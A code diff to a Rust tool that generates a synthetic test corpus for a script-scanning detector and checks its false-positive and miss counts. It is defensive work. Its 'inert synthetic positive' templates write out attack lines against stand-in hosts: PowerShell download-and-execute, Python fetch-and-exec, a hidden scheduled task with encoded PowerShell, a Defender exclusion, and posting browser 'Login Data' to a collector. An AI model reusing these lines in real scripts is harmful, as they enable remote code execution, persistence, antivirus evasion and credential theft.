@@ -36,6 +36,39 @@ const TEMPLATES: &[(&str, &str, &str)] = &[
         "synthetic_positive",
         "py",
         "# inert synthetic sample {i}\nname = 'Login Data'\nrequests.post('https://collector.example.invalid', data=name)\n",
+    ),    // Additional benign controls (P5-02): sensitive words only in comments,
+    // and ordinary update checks. Never executed.
+    (
+        "benign_admin_extra",
+        "ps1",
+        "# Do not use IEX (New-Object Net.WebClient).DownloadString(...) here {i}\n<# Add-MpPreference -ExclusionPath is forbidden by policy #>\nGet-Service -Name wuauserv | Select-Object Status\n",
+    ),
+    (
+        "benign_admin_extra",
+        "py",
+        "# Update checker {i}: never send 'Login Data' anywhere\nimport requests\nr = requests.get('https://api.example.invalid/latest')\nprint(r.json()['version'])\n",
+    ),
+    (
+        "benign_admin_extra",
+        "bat",
+        "@echo off\nrem schtasks /create is done by the installer, not here {i}\nxcopy /y config.ini \"%ProgramData%\\Tool\\\"\n",
+    ),
+    // Additional inert positives (P5-02): fetched content flowing into code
+    // execution, risky persistence and defense evasion. Never executed.
+    (
+        "synthetic_positive_more",
+        "ps1",
+        "# inert synthetic sample {i}\nIEX (New-Object Net.WebClient).DownloadString('http://payload.example.invalid/{i}')\n",
+    ),
+    (
+        "synthetic_positive_more",
+        "py",
+        "# inert synthetic sample {i}\nimport requests\ncode = requests.get('http://payload.example.invalid/{i}').text\nstage = code.strip()\nexec(stage)\n",
+    ),
+    (
+        "synthetic_positive_more",
+        "ps1",
+        "# inert synthetic sample {i}\nRegister-ScheduledTask -TaskName 'U{i}' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -enc AAAA')\nAdd-MpPreference -ExclusionPath $env:APPDATA\n",
     ),
 ];
 
@@ -73,7 +106,11 @@ fn generate(dir: &Path) -> std::io::Result<()> {
     Ok(())
 }
 
-fn summarize(jsonl: &Path) -> Result<(), Box<dyn std::error::Error>> {
+/// Gate checked by `summarize --check` (synthetic corpus only, P5-02): at
+/// most this many `benign_admin` reports may reach `review` or `high`.
+const MAX_BENIGN_ADMIN_REVIEW: u64 = 15;
+
+fn summarize(jsonl: &Path, check: bool) -> Result<(), Box<dyn std::error::Error>> {
     // category -> risk -> count
     let mut table: BTreeMap<String, BTreeMap<String, u64>> = BTreeMap::new();
     for line in fs::read_to_string(jsonl)?.lines() {
@@ -95,8 +132,38 @@ fn summarize(jsonl: &Path) -> Result<(), Box<dyn std::error::Error>> {
     }
     println!(
         "\nSynthetic corpus only: `benign*` rows above `low_signal` are false-positive candidates; \
-         `synthetic_positive` rows below `review` are misses. Not a real-world detection rate."
+         `synthetic_positive*` rows below `review` are misses. Not a real-world detection rate."
     );
+    if check {
+        let count = |category: &str, risks: &[&str]| -> u64 {
+            table.get(category).map_or(0, |c| {
+                risks.iter().map(|r| c.get(*r).copied().unwrap_or(0)).sum()
+            })
+        };
+        let mut failures = Vec::new();
+        let admin = count("benign_admin", &["review", "high"]);
+        if admin > MAX_BENIGN_ADMIN_REVIEW {
+            failures.push(format!(
+                "benign_admin review/high {admin} > {MAX_BENIGN_ADMIN_REVIEW}"
+            ));
+        }
+        for category in ["benign", "benign_pe", "benign_admin_extra"] {
+            let n = count(category, &["review", "high"]);
+            if n > 0 {
+                failures.push(format!("{category} review/high {n} > 0"));
+            }
+        }
+        for category in ["synthetic_positive", "synthetic_positive_more"] {
+            let missed = count(category, &["low_signal", "incomplete", "not_assessed"]);
+            let total = count(category, &risks);
+            if missed > 0 || total == 0 {
+                failures.push(format!("{category}: {missed} of {total} below review"));
+            }
+        }
+        if !failures.is_empty() {
+            return Err(failures.join("; ").into());
+        }
+    }
     Ok(())
 }
 
@@ -104,7 +171,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = std::env::args().skip(1).collect();
     match args.as_slice() {
         [cmd, dir] if cmd == "generate" => Ok(generate(Path::new(dir))?),
-        [cmd, file] if cmd == "summarize" => summarize(Path::new(file)),
-        _ => Err("usage: bench_corpus generate <dir> | summarize <scan.jsonl>".into()),
+        [cmd, file] if cmd == "summarize" => summarize(Path::new(file), false),
+        [cmd, flag, file] if cmd == "summarize" && flag == "--check" => {
+            summarize(Path::new(file), true)
+        }
+        _ => Err("usage: bench_corpus generate <dir> | summarize [--check] <scan.jsonl>".into()),
     }
 }
